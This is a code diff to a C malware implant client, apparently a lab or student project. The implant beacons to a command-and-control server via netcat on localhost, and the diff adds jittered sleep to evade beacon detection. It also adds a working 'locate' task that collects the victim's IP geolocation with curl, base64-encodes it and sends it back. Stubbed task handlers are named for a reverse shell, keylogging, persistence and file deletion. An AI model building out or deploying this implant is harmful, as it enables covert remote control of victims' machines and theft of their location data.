@@ -2,10 +2,12 @@
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
+#include <time.h>
 #include "base64.h"
 
 char uid[64];
 double sleep_time = 5;
+double jitter = 0.0;
 
 void get_uid() {
     FILE *fp;
@@ -15,97 +17,161 @@ void get_uid() {
     fgets(result, sizeof(result), fp);
     pclose(fp);
     
-    // format attendu: "Ok, ad8895843b")
-    strtok(result, ",");         // ignore le premier champ
+    // expected format: "Ok, ad8895843b")
+    strtok(result, ",");         // ignore the first field
     char *id = strtok(NULL, ",");
+    
+    // Trim trailing whitespace and newlines
+    if (id != NULL) {
+        char *end = id + strlen(id) - 1;
+        while (end > id && (*end == ' ' || *end == '\n' || *end == '\r')) {
+            *end = '\0';
+            end--;
+        }
+    }
+    
     strcpy(uid, id);
     
-    printf("Mon UID: %s\n", uid);
+    printf("My UID: '%s'\n", uid);
 }
 
 void task_execve() {
-    printf("Exécution de la tâche execve\n");
+    printf("Executing task execve\n");
     return;
 }
 
-void task_sleep() {
-    printf("Exécution de la tâche sleep\n");
+void task_sleep(char *sleep_time_str, char *jitter_str) {
+    printf("Executing task sleep\n");
+    
+    if (sleep_time_str != NULL) {
+        char *decoded_sleep = decode(sleep_time_str);
+        if (decoded_sleep != NULL) {
+            sleep_time = atof(decoded_sleep);
+            printf("New sleep time: %.2f seconds\n", sleep_time);
+            free(decoded_sleep);
+        }
+    }
+
+    if (jitter_str != NULL) {
+        char *decoded_jitter = decode(jitter_str);
+        if (decoded_jitter != NULL) {
+            jitter = atof(decoded_jitter);
+            printf("Jitter: %.2f%%\n", jitter);
+            free(decoded_jitter);
+        }
+    }
+    
     return;
 }
 
-int task_locate() {
-    printf("Exécution de la tâche locate\n");
+void calculate_random_sleep_time() {
+    double time_1 = sleep_time - (jitter/100.0 * sleep_time);
+    double time_2 = sleep_time + (jitter/100.0 * sleep_time);
     
-    char result[4096];
-    memset(result, 0, sizeof(result));
+    // seeding random number generator
+    srand(time(NULL));
     
-    // Récupération des informations de géolocalisation via ipinfo.io
+    double random_factor = (double)rand() / RAND_MAX;
+    sleep_time = time_1 + random_factor * (time_2 - time_1);
+}
+
+void task_locate(const char *id_task) {
+    printf("Executing task locate\n");
+
+    char result_buffer[4096];
+    memset(result_buffer, 0, sizeof(result_buffer));
+
+    // get localisation info with ipinfo.io
     FILE *fp = popen("curl -s ipinfo.io", "r");
-    
+    if (fp == NULL) {
+        perror("Error executing curl");
+        return;
+    }
+
     char buffer[1024];
     while (fgets(buffer, sizeof(buffer), fp) != NULL) {
-        strcat(result, buffer);
+        strcat(result_buffer, buffer);
     }
     pclose(fp);
+
+    char *encoded_result = encode(result_buffer);
+    if (encoded_result == NULL) {
+        printf("Error encoding to base64\n");
+        return;
+    }
+
+    // building and executing the command
+    // expected format : "RESULT,uid,id_task,encoded_result")
+    char cmd[2048];
+    printf("command executed : echo 'RESULT,%s,%s,%s' | nc 127.0.0.1 8080\n", uid, id_task, encoded_result);
     
-    // encoding in base64
-    char *encoded_result = encode(result);
+    // Ensure proper command formatting with cleaned UID
+    snprintf(cmd, sizeof(cmd), "echo 'RESULT,%s,%s,%s' | nc 127.0.0.1 8080", uid, id_task, encoded_result);
     
-    printf("Informations de géolocalisation (base64): %s\n", encoded_result);
+    // Execute and capture the response
+    char response[1024] = {0};
+    FILE *cmd_fp = popen(cmd, "r");
+    if (cmd_fp != NULL) {
+        fgets(response, sizeof(response), cmd_fp);
+        pclose(cmd_fp);
+        printf("Server response: %s\n", response);
+    } else {
+        perror("Error sending the result");
+    }
+
+    // free memory
     free(encoded_result);
-    
-    return 0;
 }
 
 void task_revshell() {
-    printf("Exécution de la tâche revshell\n");
+    printf("Executing task revshell\n");
     return;
 }
 
 void task_keylog() {
-    printf("Exécution de la tâche keylog\n");
+    printf("Executing task keylog\n");
     return;
 }
 
 void task_persist() {
-    printf("Exécution de la tâche persist\n");
+    printf("Executing task persist\n");
     return;
 }
 
 void task_cat() {
-    printf("Exécution de la tâche cat\n");
+    printf("Executing task cat\n");
     return;
 }
 
 void task_mv() {
-    printf("Exécution de la tâche mv\n");
+    printf("Executing task mv\n");
     return;
 }
 
 void task_rm() {
-    printf("Exécution de la tâche rm\n");
+    printf("Executing task rm\n");
     return;
 }
 
 void task_ps() {
-    printf("Exécution de la tâche ps\n");
+    printf("Executing task ps\n");
     return;
 }
 
 void task_netstat() {
-    printf("Exécution de la tâche netstat\n");
+    printf("Executing task netstat\n");
     return;
 }
 
 void execute_server_command(const char *command, char *result, size_t result_size) {
     FILE *fp = popen(command, "r");
     if (fp == NULL) {
-        perror("Erreur lors de l'exécution de la commande");
+        perror("Error executing the command");
         result[0] = '\0';
         return;
     }
     if (fgets(result, result_size, fp) == NULL) {
-        perror("Erreur lors de la lecture de la réponse");
+        perror("Error reading the response");
         result[0] = '\0';
     }
     pclose(fp);
@@ -118,24 +184,27 @@ void check_commands() {
     sprintf(cmd, "echo 'FETCH,%s' | nc 127.0.0.1 8080", uid);
     execute_server_command(cmd, result, sizeof(result));
     
-    printf("Réponse serveur: %s\n", result);
+    printf("Server response: %s\n", result);
     
-    // Vérification si le serveur renvoie une erreur
+    // Check if the server returns an error
     if (strncmp(result, "ERROR", 5) == 0) {
-        printf("Erreur reçue du serveur : %s\n", result);
+        printf("Error received from the server: %s\n", result);
         return;
     }
     
-    // format attendu : "type,id_task,command,argument")
+    // expected format : "type,id_task,command,argument")
     char *type = strtok(result, ",");
     
     if (type != NULL) {
+        char *id_task = strtok(NULL, ",");
         if (strcmp(type, "EXECVE") == 0) {
             task_execve();
         } else if (strcmp(type, "SLEEP") == 0) {
-            task_sleep();
+            char *sleep_time = strtok(NULL, ",");
+            char *jitter = strtok(NULL, ",");
+            task_sleep(sleep_time, jitter);
         } else if (strcmp(type, "LOCATE") == 0) {
-            task_locate();
+            task_locate(id_task);
         } else if (strcmp(type, "REVSHELL") == 0) {
             task_revshell();
         } else if (strcmp(type, "KEYLOG") == 0) {
@@ -153,15 +222,15 @@ void check_commands() {
         } else if (strcmp(type, "NETSTAT") == 0) {
             task_netstat();
         } else {
-            printf("Type inconnu ou non pris en charge : %s\n", type);
+            printf("Unknown or unsupported type: %s\n", type);
         }
     } else {
-        printf("Réponse mal formatée ou vide.\n");
+        printf("Malformed or empty response.\n");
     }
 }
 
 int main() {
-    // Initialiser la table de décodage
+    // Initialize the decoding table
     build_decoding_table();
     
     // step 1 : get uid
@@ -169,12 +238,17 @@ int main() {
     
     while (1) {
         // step 2 : check tasks
-        printf("\nVérification des commandes...\n");
+        printf("\nChecking commands...\n");
         check_commands();
+        
+        // Calculate random sleep time before sleeping
+        calculate_random_sleep_time();
+        
+        printf("Pause of %.2f seconds\n", sleep_time);
         sleep(sleep_time);
     }
     
-    // Nettoyer avant de quitter
+    // cleaning
     base64_cleanup();
     return 0;
 }
